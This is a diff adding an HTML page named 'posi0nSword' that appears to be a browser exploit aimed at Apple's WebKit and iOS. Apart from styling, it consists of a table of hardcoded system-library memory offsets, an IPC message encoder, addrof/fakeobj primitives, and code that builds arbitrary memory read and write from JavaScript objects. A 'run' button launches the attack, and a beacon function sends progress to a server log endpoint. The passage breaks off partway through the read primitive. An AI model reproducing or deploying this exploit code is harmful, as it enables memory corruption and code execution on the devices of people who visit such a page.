@@ -1,0 +1,1427 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>posi0nSword</title>
+    <style>
+        :root {
+            --text: #f0f0f3;
+            --text-dim: #9a9aa2;
+            --green: #34d65f;
+            --green-soft: #5ee07f;
+            --green-dim: #1f7a37;
+            --cyan: #57c7ff;
+            --magenta: #c792ea;
+            --ui: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif;
+            --glass: rgba(24, 24, 28, 0.5);
+            --glass-strong: rgba(26, 26, 31, 0.6);
+            --hairline: rgba(255, 255, 255, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* ---- Glass console (full bleed) ---- */
+        .console {
+            position: relative;
+            z-index: 1;
+            flex: 1;
+            min-height: 0;
+            overflow-y: auto;
+            padding: 20px 20px;
+            margin:10px;
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: var(--text);
+            height: 75%;
+            
+            width:90%;
+            border-radius: 50px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .console::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .console::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.14);
+            border-radius: 4px;
+        }
+
+        html,
+        body {
+            height: 100%;
+        }
+
+        body {
+            font-family: var(--ui);
+            color: var(--text);
+            height: 100dvh;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
+            background: #0a0c0b;
+            position: relative;
+        }
+
+        /* ---- Ambient backdrop (what the glass refracts) ---- */
+        body::before {
+            content: "";
+            position: fixed;
+            inset: -20%;
+            z-index: 0;
+            background:
+                radial-gradient(40% 50% at 18% 10%, rgba(52, 214, 95, 0.22), transparent 70%),
+                radial-gradient(46% 56% at 88% 20%, rgba(40, 120, 220, 0.18), transparent 70%),
+                radial-gradient(60% 60% at 70% 96%, rgba(52, 214, 95, 0.16), transparent 72%),
+                radial-gradient(50% 50% at 24% 90%, rgba(150, 80, 230, 0.14), transparent 72%),
+                #0a0c0b;
+            animation: drift 22s ease-in-out infinite alternate;
+        }
+
+        @keyframes drift {
+            from {
+                transform: translate3d(-2%, -1%, 0) scale(1.02);
+            }
+
+            to {
+                transform: translate3d(2%, 2%, 0) scale(1.08);
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 16px;
+            background: #101216;
+            color: #e7e7e7;
+        }
+
+        .glass {
+            backdrop-filter: blur(30px) saturate(150%);
+            -webkit-backdrop-filter: blur(30px) saturate(150%);
+        }
+
+        /* ---- Modal (About / Credits) ---- */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 10;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            background: rgba(5, 6, 6, 0);
+            backdrop-filter: blur(0px);
+            -webkit-backdrop-filter: blur(0px);
+            transition: background 0.4s ease, backdrop-filter 0.4s ease, -webkit-backdrop-filter 0.4s ease;
+        }
+
+        .overlay[data-open="true"],
+        .overlay[data-open="closing"] {
+            display: flex;
+        }
+
+        .overlay[data-open="true"] {
+            background: rgba(5, 6, 6, 0.42);
+            backdrop-filter: blur(9px);
+            -webkit-backdrop-filter: blur(9px);
+        }
+/* ---- Glass control bar ---- */
+.bar {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: center;
+      border-radius: 60px;
+      margin:15px;
+      justify-content: space-between;
+      -webkit-justify-content: space-between;
+      padding: 12px 16px calc(12px + env(safe-area-inset-bottom));
+    }
+
+    .status {
+      display: flex;
+      align-items: center;
+      padding: 7px 12px 7px 10px;
+      border-radius: 11px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      font-size: 12px;
+      letter-spacing: 0.04em;
+      color: var(--text-dim);
+      white-space: nowrap;
+      flex-shrink: 0;
+      transition: color 0.2s ease;
+    }
+
+    .status .dot {
+      position: relative;
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      background: var(--green);
+      flex-shrink: 0;
+    }
+
+    .status .dot::after {
+      content: "";
+      position: absolute;
+      inset: -5px;
+      border-radius: 50%;
+      border: 1.5px solid var(--green);
+      opacity: 0;
+      animation: ping 2.4s ease-out infinite;
+    }
+
+    @keyframes ping {
+      0% {
+        transform: scale(0.6);
+        opacity: 0.7;
+      }
+
+      70% {
+        transform: scale(1.6);
+        opacity: 0;
+      }
+
+      100% {
+        opacity: 0;
+      }
+    }
+
+    .status .label {
+      text-transform: uppercase;
+    }
+
+    .status[data-state="running"] {
+      color: #ffe27a;
+    }
+
+    .status[data-state="running"] .dot {
+      background: #ffd60a;
+    }
+
+    .status[data-state="running"] .dot::after {
+      border-color: #ffd60a;
+      animation-duration: 1s;
+    }
+
+    .status[data-state="done"] {
+      color: var(--green-soft);
+    }
+
+    a {
+      color: var(--green-soft);
+    }
+        .overlay[data-open="closing"] {
+            background: rgba(5, 6, 6, 0);
+            backdrop-filter: blur(0px);
+            -webkit-backdrop-filter: blur(0px);
+            transition-duration: 0.24s;
+        }
+
+        .modal {
+            position: relative;
+            width: min(420px, 100%);
+            border-radius: 20px;
+            background: rgba(30, 30, 36, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            box-shadow: 0 30px 80px -24px rgba(0, 0, 0, 0.7);
+            padding: 22px;
+            transform-origin: center bottom;
+        }
+
+        /* expanding halo ring that blooms behind the card on open */
+        .modal::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            border-radius: 20px;
+            pointer-events: none;
+            box-shadow: 0 0 0 0 rgba(52, 214, 95, 0.45);
+            opacity: 0;
+        }
+
+        /* glass light-sweep that rakes across the surface as it lands */
+        .modal::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            border-radius: 20px;
+            pointer-events: none;
+            background: linear-gradient(115deg, transparent 35%, rgba(255, 255, 255, 0.16) 50%, transparent 65%);
+            background-size: 250% 100%;
+            background-position: 120% 0;
+            opacity: 0;
+        }
+
+        .overlay[data-open="true"] .modal {
+            animation: modalSpring 0.62s cubic-bezier(0.18, 1.0, 0.28, 1.06) both;
+        }
+
+        .overlay[data-open="true"] .modal::after {
+            animation: modalHalo 0.7s ease-out 0.06s both;
+        }
+
+        .overlay[data-open="true"] .modal::before {
+            animation: modalSweep 0.7s ease-out 0.14s both;
+        }
+
+        .overlay[data-open="closing"] .modal {
+            animation: modalOut 0.22s cubic-bezier(0.4, 0, 1, 0.6) both;
+        }
+
+        @keyframes modalSpring {
+            0% {
+                opacity: 0;
+                transform: translateY(30px) scale(0.9);
+                filter: blur(6px);
+            }
+
+            55% {
+                opacity: 1;
+                transform: translateY(-4px) scale(1.015);
+                filter: blur(0);
+            }
+
+            78% {
+                transform: translateY(1px) scale(0.997);
+            }
+
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+                filter: blur(0);
+            }
+        }
+
+        @keyframes modalHalo {
+            0% {
+                opacity: 0.9;
+                box-shadow: 0 0 0 0 rgba(52, 214, 95, 0.5);
+            }
+
+            100% {
+                opacity: 0;
+                box-shadow: 0 0 0 22px rgba(52, 214, 95, 0);
+            }
+        }
+
+        @keyframes modalSweep {
+            0% {
+                opacity: 0;
+                background-position: 120% 0;
+            }
+
+            25% {
+                opacity: 1;
+            }
+
+            100% {
+                opacity: 0;
+                background-position: -40% 0;
+            }
+        }
+
+        @keyframes modalOut {
+            from {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+
+            to {
+                opacity: 0;
+                transform: translateY(12px) scale(0.96);
+            }
+        }
+
+        /* staggered entrance for the inner content */
+        .overlay[data-open="true"] .modal>h2,
+        .overlay[data-open="true"] .modal>#modalBody,
+        .overlay[data-open="true"] .modal>.close {
+            animation: modalContent 0.5s cubic-bezier(0.2, 0.8, 0.3, 1) both;
+        }
+
+        .overlay[data-open="true"] .modal>h2 {
+            animation-delay: 0.14s;
+        }
+
+        .overlay[data-open="true"] .modal>#modalBody {
+            animation-delay: 0.2s;
+        }
+
+        .overlay[data-open="true"] .modal>.close {
+            animation-delay: 0.28s;
+        }
+
+        @keyframes modalContent {
+            from {
+                opacity: 0;
+                transform: translateY(9px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+
+            .overlay,
+            .overlay .modal,
+            .overlay .modal::before,
+            .overlay .modal::after,
+            .overlay[data-open="true"] .modal>* {
+                animation: none !important;
+                transition: opacity 0.15s ease !important;
+            }
+        }
+
+        .modal h2 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--green);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .modal p {
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--text);
+            margin-bottom: 10px;
+        }
+
+        .modal .muted {
+            color: var(--text-dim);
+            font-size: 13px;
+        }
+
+        .modal code {
+            font-family: var(--mono);
+            font-size: 12.5px;
+            color: var(--green-soft);
+            background: rgba(52, 214, 95, 0.1);
+            padding: 1px 6px;
+            border-radius: 5px;
+        }
+
+        .modal .rows {
+            margin-top: 6px;
+        }
+
+        .modal .row {
+            display: grid;
+            grid-template-columns: minmax(64px, auto) 1fr;
+            column-gap: 16px;
+            align-items: baseline;
+            font-size: 12.5px;
+            line-height: 1.5;
+            padding: 8px 0;
+            border-top: 1px solid var(--hairline);
+        }
+
+        .modal .row .k {
+            color: var(--text-dim);
+            white-space: nowrap;
+        }
+
+        .modal .row .v {
+            color: var(--text);
+            text-align: right;
+            overflow-wrap: anywhere;
+            word-break: break-word;
+            hyphens: auto;
+        }
+
+        .modal .close {
+            appearance: none;
+            margin-top: 16px;
+            width: 100%;
+            padding: 11px;
+            border-radius: 11px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid var(--hairline);
+            color: var(--text);
+            font-size: 13px;
+            cursor: pointer;
+            transition: background 0.15s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .modal .close:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .modal .close:active {
+            transform: scale(0.98);
+        }
+
+        @media (max-width: 460px) {
+            .track-pct {
+                display: none;
+            }
+
+            .run {
+                margin-left: 6px;
+            }
+
+            .title .sub {
+                display: none;
+            }
+        }
+
+        /* ---- Top bar ---- */
+        .topbar {
+            position: relative;
+            z-index: 2;
+            display: grid;
+            grid-template-columns: 1fr auto 1fr;
+            align-items: center;
+            padding: 10px 14px calc(10px + env(safe-area-inset-top)) 14px;
+            background: rgba(26, 26, 31, 0);
+            border-radius: 50px;
+        }
+
+        .topbar .left {
+            justify-self: start;
+        }
+
+        .topbar .right {
+            justify-self: end;
+        }
+
+        .topbtn {
+            appearance: none;
+            background: transparent;
+            border: none;
+            color: var(--text-dim);
+            font-size: 13px;
+            letter-spacing: 0.02em;
+            padding: 7px 12px;
+            border-radius: 9px;
+            cursor: pointer;
+            transition: color 0.15s ease, background 0.15s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .topbtn:hover {
+            color: var(--text);
+            background: rgba(255, 255, 255, 0.06);
+        }
+
+        .topbtn:active {
+            transform: scale(0.96);
+        }
+
+        .title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text);
+            letter-spacing: 0.02em;
+            padding: 7px 14px;
+            user-select: none;
+        }
+
+
+
+        .ok {
+            color: #66ff99;
+        }
+
+        .warn {
+            color: #ffd36a;
+        }
+
+        .fail {
+            color: #ff7777;
+        }
+    </style>
+
+</head>
+
+<body>
+    <script>
+
+        var offsets = {
+            "AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken": 0x1ed745410n,
+            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker": 0x1ed744f30n,
+            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest": 0x1ed744e68n,
+            "AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice": 0x1ed744f08n,
+            "AVFAudio__OBJC_CLASS__AVSpeechUtterance": 0x1ed744300n,
+            "AXCoreUtilities__DefaultLoader": 0x1ed5a8748n,
+            "CFNetwork__gConstantCFStringValueTable": 0x1ee5a9570n,
+            "CMPhoto__kCMPhotoTranscodeOption_Strips": 0x1e77a3028n,
+            "emptyString": 0x1ed794420n,
+            "Foundation__NSBundleTables_bundleTables_value": 0x1ed43e308n,
+            "free_slabs": 0x1ed4e4e30n,
+            "GPUProcess_singleton": 0x1eb01db60n,
+            "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt": 0x1ed5697b0n,
+            "ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage": 0x1ed5697a8n,
+            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage": 0x1ed569738n,
+            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1ed569730n,
+            "ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata": 0x1ed5693b8n,
+            "ImageIO__gFunc_CMPhotoCompressionSessionAddExif": 0x1ed569728n,
+            "ImageIO__gImageIOLogProc": 0x1ee39b008n,
+            "libdyld__gAPIs": 0x1ed0b4010n,
+            "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
+            "mach_task_self_ptr": 0x280a64078n,
+            "mainRunLoop": 0x1ed7ac020n,
+            "pthread_create": 0x1df150ee8n,
+            "runLoopHolder_tid": 0x1ed7bcd08n,
+            "Security__gSecurityd": 0x1ea91d500n,
+            "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
+            "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
+            "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed6237d0n,
+            "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
+            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType": 0x1ed6238a0n,
+            "WebCore__softLinkOTSVGOTSVGTableRelease": 0x1ee638020n,
+            "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
+            "libARI_cstring": 0x0n,
+            "libGPUCompilerImplLazy_cstring": 0x24c231870n,
+            "libGPUCompilerImplLazy__invoker": 0x24d0e78b4n,
+            "libsystem_pthread_base": 0x0n,
+            "pthread_linkedit": 0x1fedfc000n,
+            "PerfPowerServicesReader_cstring": 0x0n,
+            "AVFAudio__cfstr_SystemLibraryTextToSpeech": 0x1f3850990n,
+            "dyld__RuntimeState_vtable": 0x1eee9f700n,
+            "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
+            "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
+            "RemoteGraphicsContextGLWorkQueue": 0x1ed641758n,
+            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f1432e30n,
+            "WebCore__initPKContact_once": 0x1ed6245f8n,
+            "WebCore__initPKContact_value": 0x1ed624600n,
+            "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
+            "WebCore__HTMLDocument_vtable": 0x1f1376268n,
+            "DesktopServicesPriv_bss": 0x1ecff4080n,
+            "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
+            "pthread_create_jsc": 0x1998f5688n,
+            "libsystem_kernel__thread_suspend": 0x22ca45238n,
+            "libdyld__dlopen": 0x1800e8350n,
+            "libdyld__dlsym": 0x1800e8444n,
+            "jsc_base": 0x197f59000n,
+            "dyld__dlopen_from_lambda_ret": 0x18011cfc8n,
+            "dyld__signPointer": 0x1801283e4n,
+            "dyld__RuntimeState_emptySlot": 0x18015eb6cn,
+            "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
+            "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
+            "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
+            "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
+            "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
+            "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
+            "HOMEUI_cstring": 0x1834dbfa1n,
+            "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
+            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt_func": 0x1a5a87078n,
+            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage_func": 0x1a5a87228n,
+            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage_func": 0x1a5a4a570n,
+            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation_func": 0x1a5a4ab94n,
+            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata_func": 0x1a5a4b2a8n,
+            "CMPhoto__CMPhotoCompressionSessionAddExif_func": 0x1a5a4ace0n,
+        }
+
+    </script>
+    <div class="topbar glass">
+        <div class="left"><button class="topbtn" id="aboutBtn">about</button></div>
+        <div class="title">
+            <span>posi0nSword</span>
+        </div>
+        <div class="right"><button class="topbtn" id="creditsBtn">credits</button></div>
+    </div>
+    <!-- Modal -->
+    <div class="overlay" id="overlay">
+        <div class="modal glass" id="modal">
+            <h2 id="modalTitle"></h2>
+            <div id="modalBody"></div>
+            <button class="close" id="modalClose">close ⏎</button>
+        </div>
+        </div>
+
+        <div id="output-list" class="console glass"></div>
+        <div class="bar glass">
+            <div class="status" id="status" data-state="ready">
+              <span class="dot"></span><span class="label" id="statusText">ready</span>
+            </div>
+            <button class="run" onclick="init()" id="runBtn">
+              <span class="prompt"></span><span class="label">run</span>
+            </button>
+          </div>
+        <style>
+            .run {
+                appearance: none;
+                flex-shrink: 0;
+                padding: 7px 20px;
+                border-radius: 11px;
+                background: rgba(52, 214, 95, 0.1);
+                border: 1px solid rgba(52, 214, 95, 0.4);
+                color: var(--green);
+                font-size: 14px;
+                cursor: pointer;
+                display: flex;
+                align-items: center;
+                -webkit-tap-highlight-color: transparent;
+            }
+
+            .run .prompt {
+                color: var(--green-dim);
+            }
+
+            .run:hover {
+                background: rgba(52, 214, 95, 0.18);
+                border-color: var(--green);
+                box-shadow: 0 0 18px -2px rgba(52, 214, 95, 0.5);
+            }
+
+
+            @media (max-width: 460px) {
+                .track-pct {
+                    display: none;
+                }
+
+                .run {
+                    margin-left: 6px;
+                }
+
+                .title .sub {
+                    display: none;
+                }
+            }
+        </style>
+        <script>
+            p = {};
+            var p_rce = {
+                _root: []
+            };
+            let MessageName;
+            class Encoder {
+                constructor(messageName, destinationID) {
+                    this.argList = [];
+                    if (arguments.length) {
+                        this.messageName = messageName;
+                        this.destinationID = destinationID;
+                        this.encode('uint8_t', 0);
+                        this.encode('uint16_t', this.messageName);
+                        this.encode('uint64_t', this.destinationID);
+                    }
+                }
+                encode(type, value) {
+                    this.argList.push({
+                        type,
+                        value
+                    });
+                    return this;
+                }
+                encode8BitString(str) {
+                    this.encode('uint32_t', str.length);
+                    this.encode('bool', true);
+                    this.argList.push({
+                        type: 'bytes',
+                        value: str
+                    });
+                    return this;
+                }
+                encodeNullString() {
+                    this.encode('uint32_t', 0xffffffff);
+                    return this;
+                }
+                static argumentAlignment(arg) {
+                    switch (arg.type) {
+                        case 'uint64_t':
+                        case 'int64_t':
+                            return 8;
+                        case 'uint32_t':
+                        case 'int32_t':
+                        case 'float':
+                            return 4;
+                        case 'uint16_t':
+                        case 'int16_t':
+                            return 2;
+                        case 'uint8_t':
+                        case 'int8_t':
+                        case 'bool':
+                            return 1;
+                        case 'bytes':
+                            return 0;
+                        default:
+                            ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
+                    }
+                }
+                static argumentSize(arg) {
+                    switch (arg.type) {
+                        case 'uint64_t':
+                        case 'int64_t':
+                            return 8;
+                        case 'uint32_t':
+                        case 'int32_t':
+                        case 'float':
+                            return 4;
+                        case 'uint16_t':
+                        case 'int16_t':
+                            return 2;
+                        case 'uint8_t':
+                        case 'int8_t':
+                        case 'bool':
+                            return 1;
+                        case 'bytes':
+                            if (typeof arg.value == 'string') {
+                                return arg.value.length;
+                            } else {
+                                return arg.value.byteLength;
+                            }
+                        default:
+                            ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
+                    }
+                }
+                buffer() {
+                    if (this.__buffer) return this.__buffer;
+                    let bufferSize = 0;
+                    for (const arg of this.argList) {
+                        const alignment = Encoder.argumentAlignment(arg);
+                        const remainder = bufferSize % alignment;
+                        if (remainder) {
+                            bufferSize += alignment - remainder;
+                        }
+                        bufferSize += Encoder.argumentSize(arg);
+                    }
+                    const buffer = new ArrayBuffer(bufferSize);
+                    const view = new DataView(buffer);
+                    let bufferOffset = 0;
+                    for (const arg of this.argList) {
+                        const alignment = Encoder.argumentAlignment(arg);
+                        const remainder = bufferOffset % alignment;
+                        if (remainder) {
+                            bufferOffset += alignment - remainder;
+                        }
+                        switch (arg.type) {
+                            case 'float':
+                                view.setFloat32(bufferOffset, arg.value, true);
+                                break;
+                            case 'uint64_t':
+                                view.setBigUint64(bufferOffset, arg.value, true);
+                                break;
+                            case 'int64_t':
+                                view.setBigInt64(bufferOffset, arg.value, true);
+                                break;
+                            case 'uint32_t':
+                                view.setUint32(bufferOffset, arg.value, true);
+                                break;
+                            case 'int32_t':
+                                view.setInt32(bufferOffset, arg.value, true);
+                                break;
+                            case 'uint16_t':
+                                view.setUint16(bufferOffset, arg.value, true);
+                                break;
+                            case 'int16_t':
+                                view.setInt16(bufferOffset, arg.value, true);
+                                break;
+                            case 'uint8_t':
+                                view.setUint8(bufferOffset, arg.value);
+                                break;
+                            case 'int8_t':
+                                view.setInt8(bufferOffset, arg.value);
+                                break;
+                            case 'bool':
+                                view.setInt8(bufferOffset, !!arg.value);
+                                break;
+                            case 'bytes':
+                                const buffer_u8 = new Uint8Array(buffer);
+                                if (typeof arg.value == 'string') {
+                                    for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
+                                } else {
+                                    for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
+                                }
+                                break;
+                            default:
+                                ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
+                        }
+                        bufferOffset += Encoder.argumentSize(arg);
+                    }
+                    return this.__buffer = buffer;
+                }
+            };
+            async function loadObjcClass(cls) {
+                const bitmap = await createImageBitmap(canvas);
+                const wrappedBitmap = read64(p.addrof(bitmap) + 0x18n);
+                const imagebuffer = read64(wrappedBitmap + 0x10n);
+                write64(imagebuffer + 0x20n, cls);
+                bitmap.close();
+            }
+            let slow_fcall_resolve;
+            self.onmessage = async function (e) {
+                const data = e.data;
+                switch (data.type) {
+                    case 'prepare_dlopen_workers':
+                        {
+
+                            log("dlopen prepared from worker");
+                            //WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts
+
+                        }
+                }
+            }
+            window.onerror = function (message, source, lineno, colno, error) {
+                try {
+                    log(`JS ERROR line ${lineno}: ${message}`, "fail");
+                    setStatus("script error");
+                } catch (_) {
+                    const out = document.getElementById("output-list");
+                    if (out) out.textContent += `JS ERROR line ${lineno}: ${message}\n`;
+                }
+                console.error("JS ERROR", message, source, lineno, colno, error);
+                return true;
+            };
+
+            const convBuf = new ArrayBuffer(8);
+            const u8 = new Uint8Array(convBuf);
+            const u32 = new Uint32Array(convBuf);
+            const u64 = new BigUint64Array(convBuf);
+            const f64 = new Float64Array(convBuf);
+
+            function itof(value) {
+                u64[0] = BigInt.asUintN(64, value);
+                return f64[0];
+            }
+
+            function ftoi(value) {
+                f64[0] = value;
+                return u64[0];
+            }
+
+            function hex(value) {
+                if (typeof value !== "bigint") return String(value);
+                return "0x" + value.toString(16);
+            }
+
+            function noPAC(value) {
+                return value & 0x7fffffffffn;
+            }
+
+            function bigintFromBytes(bytes) {
+                for (let i = 0; i < 8; ++i) u8[i] = bytes[i];
+                return u64[0];
+            }
+
+            function beacon(kind, message) {
+                try {
+                    const img = new Image();
+                    img.src = `/log?kind=${encodeURIComponent(kind)}&msg=${encodeURIComponent(String(message).slice(0, 300))}&t=${Date.now()}`;
+                } catch (_) { }
+            }
+
+            function log(output, cls) {
+                beacon(cls || "log", output);
+                const addline = document.createElement("div");
+                if (cls) addline.className = cls;
+                addline.textContent = `[${new Date().toISOString().split("T")[1].split(".")[0]}] ${output}`;
+                document.getElementById("output-list").appendChild(addline);
+                addline.scrollIntoView();
+                console.log(output);
+            }
+
+            function setStatus(s) {
+                beacon("status", s);
+                document.getElementById("status").textContent = s;
+                console.log("[status]", s);
+            }
+
+            function signed32(v) {
+                v &= 0xffffffffn;
+                if (v >= 0x80000000n) return Number(v - 0x100000000n);
+                return Number(v);
+            }
+
+            function plausiblePointer(p) {
+                return typeof p === "bigint" &&
+                    p >= 0x100000000n &&
+                    p < 0x0001000000000000n &&
+                    (p & 0x7n) === 0n;
+            }
+
+            function buildDSScribblePrimitives(addrof, fakeobj) {
+                const report = {
+                    ok: false,
+                    stage: "init",
+                    reason: "",
+                    attempts: 0,
+                    scribbleAddr: 0n,
+                    vectorRaw: 0n,
+                    backingPtr: 0n,
+                    secondaryBackingPtr: 0n,
+                    proofs: 0,
+                };
+
+                let read64;
+                let write64;
+                const keepAlive = [];
+                const read64BigUint64 = new BigUint64Array(4);
+                const read64Str = "\u4444".repeat(0x10);
+                void [][read64Str];
+
+                report.stage = "find-0x20-adjacent-jsobject";
+                let scribbleElement = null;
+                let prevAddr = 0n;
+                for (let i = 0; i < 1000; ++i) {
+                    const o = { p1: 1.1, p2: 2.2 };
+                    const addr = addrof(o);
+                    report.attempts = i + 1;
+                    if (addr - prevAddr === 0x20n) {
+                        scribbleElement = o;
+                        report.scribbleAddr = addr;
+                        break;
+                    }
+                    keepAlive.push(o);
+                    prevAddr = addr;
+                }
+                if (!scribbleElement) {
+                    report.reason = "could not find adjacent 0x20 JSObject allocation";
+                    return { ok: false, report };
+                }
+
+                let changeScribbleHolder;
+                let changeScribble;
+                let originalCell;
+
+                try {
+                    report.stage = "build-change-scribble";
+                    p.addrof = function addrof(o) {
+                        boxedArray[0] = obj;
+                        return ftoi(unboxedArray[0]);
+                    }
+                    p.fakeobj = function fakeobj(addr) {
+                        unboxedArray[0] = itof(addr);
+                        return boxedArray[0];
+                    }
+                    write16 = function (ptr, u16) {
+                        let value = read64(ptr);
+                        value &= ~0xffffn;
+                        value |= u16;
+                        write64(ptr, value);
+                    };
+
+                    // Do not log or touch this fake object. It is a placeholder JSValue,
+                    // immediately replaced after harvesting a valid DoubleArray cell.
+                    changeScribbleHolder = {
+                        p1: fakeobj(0x108240700000000n),
+                        p2: scribbleElement
+                    };
+                    changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);
+
+                    scribbleElement.p3 = 1.1;
+                    scribbleElement[0] = 1.1;
+
+                    const doubleArrayCell = ftoi(changeScribble[0]);
+                    changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
+                    originalCell = changeScribble[0];
+                } catch (e) {
+                    report.reason = `change scribble failed: ${e.message}`;
+                    return { ok: false, report };
+                }
+
+                write64 = function (addr, value) {
+                    addr = BigInt.asUintN(64, addr);
+                    value = BigInt.asUintN(64, value);
+
+                    changeScribble[0] = originalCell;
+                    changeScribble[1] = itof(addr + 0x10n);
+
+                    if (value === 0n) {
+                        scribbleElement.p3 = 1;
+                        delete scribbleElement.p3;
+                    } else if (value < 0x2000000000000n) {
+                        scribbleElement.p3 = fakeobj(value);
+                    } else if (value <= 0x7ff2000000000000n ||
+                        (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
+                        scribbleElement.p3 = itof(value - 0x2000000000000n);
+                    } else {
+                        const offAddr = addr + 8n;
+                        const offVal = read64(offAddr);
+                        const lo = signed32(value);
+                        const hi = signed32(value >> 32n);
+                        scribbleElement.p3 = lo;
+                        changeScribble[1] = itof(addr + 0x14n);
+                        scribbleElement.p3 = hi;
+                        write64(offAddr, offVal);
+                    }
+                };
+                write64 = function (addr, value) {
+                    addr = BigInt.asUintN(64, addr);
+                    value = BigInt.asUintN(64, value);
+
+                    changeScribble[0] = originalCell;
+                    changeScribble[1] = itof(addr + 0x10n);
+
+                    if (value === 0n) {
+                        scribbleElement.p3 = 1;
+                        delete scribbleElement.p3;
+                    } else if (value < 0x2000000000000n) {
+                        scribbleElement.p3 = fakeobj(value);
+                    } else if (value <= 0x7ff2000000000000n ||
+                        (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
+                        scribbleElement.p3 = itof(value - 0x2000000000000n);
+                    } else {
+                        const offAddr = addr + 8n;
+                        const offVal = read64(offAddr);
+                        const lo = signed32(value);
+                        const hi = signed32(value >> 32n);
+                        scribbleElement.p3 = lo;
+                        changeScribble[1] = itof(addr + 0x14n);
+                        scribbleElement.p3 = hi;
+                        write64(offAddr, offVal);
+                    }
+                };
+
+
+                try {
+                    report.stage = "build-read64-string-window";
+                    changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
+                    const read64Float64Bytes = ftoi(scribbleElement[1]);
+                    read64BigUint64[0] = 0x10000000006n;
+                    read64BigUint64[1] = read64Float64Bytes + 0x10n;
+
+                    changeScribble[1] = itof(addrof(read64Str) + 8n);
+                    scribbleElement[0] = itof(read64Float64Bytes);
+
+                    read64 = function (addr) {
+                        read64BigUint64[1] = BigInt.asUintN(64, addr);
+                        return BigInt(read64Str.charCodeAt(0)) |
+                            (BigInt(read64Str.charCodeAt(1)) << 16n) |
+                            (BigInt(read64Str.charCodeAt(2)) << 32n) |
